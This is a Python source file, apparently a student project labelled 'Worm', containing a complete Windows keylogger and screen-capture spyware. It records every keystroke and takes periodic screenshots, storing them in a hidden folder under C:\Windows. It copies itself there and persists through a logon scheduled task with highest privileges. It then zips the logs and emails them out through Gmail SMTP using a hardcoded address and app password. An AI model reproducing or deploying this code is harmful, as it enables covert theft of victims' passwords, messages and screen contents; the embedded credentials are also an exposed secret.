import os
import smtplib
import shutil
import threading
import subprocess
import sys
import time
import zipfile
import json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime

# Importeert de externe imports om het script te runnen
try:
    import keyboard
    import pyautogui
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "keyboard"])
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyautogui"])
    import keyboard
    import pyautogui

# variabelen
exitEvent = threading.Event()
now = datetime.now()
dateTimeFull = now.strftime("%d/%m/%Y, %H:%M:%S")
dateTimeFolder = now.strftime("%d.%m.%Y_%H.%M.%S")
dateTimeDay = now.strftime("%d-%m-%Y")
scriptPath = os.path.abspath("C:\\Windows\\s142486_WormFolder\\Worm.pyw")
hiddenFolderPath = os.path.expanduser("C:\\Windows\\s142486_WormFolder")
path = f"C:\\Windows\\s142486_WormFolder\\Logs_{dateTimeFolder}\\keylog.txt"
logs = "C:\\Windows\\s142486_WormFolder" 
paramsPath = os.path.join(hiddenFolderPath, "Params.json")

# EXPRESS EMAIL SETTINGS EXPLICIET VERMELD OM TRANSPARANT TE ZIJN, DIT IS EEN TESTACCOUNT EN WORDT NIET GEBRUIKT VOOR MALWARE
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL = "Rvm855219@gmail.com"
PASSWORD = "rtpq bdhn pqib rrgk"
logLock = threading.Lock()
screenshotCount = 0

def createParamJson():
    defaultParams = {
        "TimeBetweenEachScreenshot" : 300,
        "LogKeys" : True,
        "LogScreen" : True,
        "Logging" : True,
        "EnableKillSwitch" : True,
        "persistentMailInterval" : 120
    }
    
    if not os.path.exists(paramsPath):
        with open(paramsPath, 'w') as paramsFile:
            json.dump(defaultParams, paramsFile, indent=4)


def loadParams():
    if os.path.exists(paramsPath):
        with open(paramsPath, 'r') as paramsFile:
            paramsContent = json.load(paramsFile)
            timeBetweenScreenshots = paramsContent.get("TimeBetweenEachScreenshot")
            logKeys = paramsContent.get("LogKeys")
            logScreen = paramsContent.get("LogScreen")
            logging = paramsContent.get("Logging")
            enableKillSwitch = paramsContent.get("EnableKillSwitch")
            persistentMailInterval = paramsContent.get("persistentMailInterval")
            return timeBetweenScreenshots, logKeys, logScreen, logging, enableKillSwitch, persistentMailInterval
    else :
        timeBetweenScreenshots = 300
        logKeys = True
        logScreen = True
        logging = True
        enableKillSwitch = True
        persistentMailInterval = 120
        return timeBetweenScreenshots, logKeys, logScreen, logging, enableKillSwitch, persistentMailInterval

timeBetweenScreenshots, logKeys, logScreen, logging, enableKillSwitch, persistentMailInterval = loadParams()

# functie die een taak maakt in taakplanner waarbij het script zichzelf uitvoert
def runOnLogin(taskName, scriptPath):
    command = [
        "schtasks",
        "/create",
        "/sc", "ONLOGON",
        "/tn", taskName,
        "/tr", f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{scriptPath}"',
        "/rl", "highest",
        "/F" 
    ]
    
    result = subprocess.run(
        command,
        capture_output=True,
        text=True
    )

    if result.returncode != 0:
        print(result.stderr)
        return

    # Battery-instellingen
    powershell_command = [
        "powershell",
        "-NoProfile",
        "-Command",
        f'''
        $settings = New-ScheduledTaskSettingsSet `
            -AllowStartIfOnBatteries `
            -DontStopIfGoingOnBatteries

        Set-ScheduledTask `
            -TaskName "{taskName}" `
            -Settings $settings
        '''
    ]

    result = subprocess.run(
        powershell_command,
        capture_output=True,
        text=True
    )

    if result.returncode != 0:
        print("PowerShell error:")
        print(result.stderr)
    
# maakt de folder scructuur
def makeStructure():
    if not os.path.exists(hiddenFolderPath):
        os.makedirs(hiddenFolderPath)
    os.system(f'attrib +h "{hiddenFolderPath}"')
    if not os.path.exists(hiddenFolderPath+f"\\Logs_{dateTimeFolder}"):
        os.makedirs(hiddenFolderPath+f"\\Logs_{dateTimeFolder}")
    if logScreen:
        if not os.path.exists(hiddenFolderPath+f"\\Logs_{dateTimeFolder}\\ScreenLogs"):
            os.makedirs(hiddenFolderPath+f"\\Logs_{dateTimeFolder}\\ScreenLogs")
            
#kopieert het script van waar het ook gerunned wordt
def copyScript(hiddenFolderPath):
    scriptPath = os.path.abspath(__file__)
    destinationPath = os.path.join(hiddenFolderPath, os.path.basename(scriptPath))

    if not os.path.exists(destinationPath):
        shutil.copy(scriptPath, hiddenFolderPath)

# zipt de logs van de vorige sessie en roept dan de mail functie
def zipAllPrevSessions(logsDir):
    """Zipt alle oude sessie-folders (alles behalve de huidige sessie)"""
    currentSession = f"Logs_{dateTimeFolder}"
    
    for item in os.listdir(logsDir):
        itemPath = os.path.join(logsDir, item)
        # skip huidige sessie, bestaande zips, en niet-folders
        if item == currentSession or not os.path.isdir(itemPath) or item == os.path.basename(hiddenFolderPath):
            continue
        if not item.startswith("Logs_"):
            continue
            
        zipPath = os.path.join(logsDir, f"{item}.zip")
        if not os.path.exists(zipPath):
            with zipfile.ZipFile(zipPath, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(itemPath):
                    for file in files:
                        filePath = os.path.join(root, file)
                        arcname = os.path.relpath(filePath, start=logsDir)
                        zipf.write(filePath, arcname)
        shutil.rmtree(itemPath)

# Mail functie
def sendSingleMail(zipFile):
    """Stuurt één zip als aparte mail. Returnt True bij succes."""
    try:
        msg = MIMEMultipart()
        msg["From"] = EMAIL
        msg["To"] = EMAIL
        msg["Subject"] = os.getlogin()
        msg.attach(MIMEText(f"{os.path.basename(zipFile)}", "plain"))

        with open(zipFile, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header(
                "Content-Disposition",
                f'attachment; filename="{os.path.basename(zipFile)}"',
            )
            msg.attach(part)

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=10)
        server.starttls()
        server.login(EMAIL, PASSWORD)
        server.sendmail(EMAIL, EMAIL, msg.as_string())
        server.quit()
        return True
    except Exception:
        return False
    
def mailQueue():
    while not exitEvent.is_set():
        zipFiles = [
            os.path.join(logs, f) 
            for f in os.listdir(logs) 
            if f.endswith(".zip")
        ]
        
        if not zipFiles:
            exitEvent.wait(persistentMailInterval)
            continue
        
        for zipFile in zipFiles:
            if sendSingleMail(zipFile):
                os.remove(zipFile)
        
        # wacht 2 min, maar check exitEvent zodat killswitch werkt
        exitEvent.wait(persistentMailInterval)

# Screenlog functie
def screenLogger():
    global screenshotCount
    if logScreen and logging:
        while not exitEvent.is_set():
            screenshotCount += 1
            timestamp = datetime.now().strftime("%H.%M.%S")
            filename = f"{hiddenFolderPath}\\Logs_{dateTimeFolder}\\ScreenLogs\\Screenlog_{timestamp}_{screenshotCount}.jpg"
            screenshot = pyautogui.screenshot()
            screenshot.save(filename)
            
            with logLock:
                with open(path, 'a') as f:
                    f.write(f"\n|== SCREENSHOT #{screenshotCount} | {timestamp} ==|\n")
            
            exitEvent.wait(timeBetweenScreenshots) 

# Keylog functie
def keyLogger():
    if logKeys and logging:
        with open(path, 'a') as dataFile:
            dataFile.write(
                "|============================================================================|\n"
                f"|         V         ! KEYBOARD LOG: {dateTimeFull} !         V         |\n"
                "|============================================================================|\n\n"
                f"<<{now.strftime('%H:%M')}>> "
            )
            key_map = {
                "space": " ",
                "windows gauche": " *WINDOW* ",
                "backspace": " *BACKSPACE* ",
                "alt": " *ALT* ",
                "alt gr": " *ALT_GR* ",
                "ctrl droite": " *RIGHT_CTRL* ",
                "ctrl": " *CTRL* ",
                "maj": " *SHIFT* ",
                "right shift": " *RIGHT_SHIFT* ",
                "verr.maj": " *SHIFT_LOCK* ",
                "tab": " *TAB* ",
                "haut": " *ARROW_UP* ",
                "gauche": " *ARROW_LEFT* ",
                "bas": " *ARROW_DOWN* ",
                "droite": " *ARROW_RIGHT* ",
                "enter": " ENTER\n",
                "suppr": " *DELETE* ",
                "esc": " *ESCAPE* ",
                "f1": " *F1* ",
                "f2": " *F2* ",
                "f3": " *F3* ",
                "f4": " *F4* ",
                "f5": " *F5* ",
                "f6": " *F6* ", 
                "f7": " *F7* ",
                "f8": " *F8* ",
                "f9": " *F9* ",
                "f10": " *F10* ",
                "f11": " *F11* ",
                "f12": " *F12* "
            }
            while not exitEvent.is_set():
                try:
                    tempNow = datetime.now()
                    event = keyboard.read_event()
                    if event.event_type == keyboard.KEY_DOWN:
                        with logLock:
                            if event.name in key_map:
                                dataFile.write(key_map[event.name])
                                if event.name == "enter":
                                    dataFile.write(f"<<{tempNow.strftime('%H:%M')}>> ")
                            else:
                                dataFile.write(event.name)
                            dataFile.flush()
                except Exception as e:
                    dataFile.write(f"Error: {e}\n")
                    dataFile.flush()
                    break

# Killswitch functie
def killSwitch():
    if enableKillSwitch:
        keyboard.wait("ctrl+alt+k")
        exitEvent.set()
    

if __name__ == "__main__":
    try:    
        runOnLogin("s142486_Worm", scriptPath)
        makeStructure()
        copyScript(hiddenFolderPath)
        createParamJson()
        zipAllPrevSessions(hiddenFolderPath)

        keyLog_thread = threading.Thread(target=keyLogger, name="KeyLogger")
        screenLog_thread = threading.Thread(target=screenLogger, name="ScreenLogger")
        kill_thread = threading.Thread(target=killSwitch, name="StopKeybindMonitor")
        mail_thread = threading.Thread(target=mailQueue, name="MailQueue", daemon=True)

        keyLog_thread.start()
        screenLog_thread.start()
        kill_thread.start()
        mail_thread.start()

        keyLog_thread.join()
        screenLog_thread.join()
        kill_thread.join()
        
    except Exception as e:
        with open(os.path.join(hiddenFolderPath, "error.log"), 'a') as f:
            f.write(f"{datetime.now()} | FATAL: {e}\n")
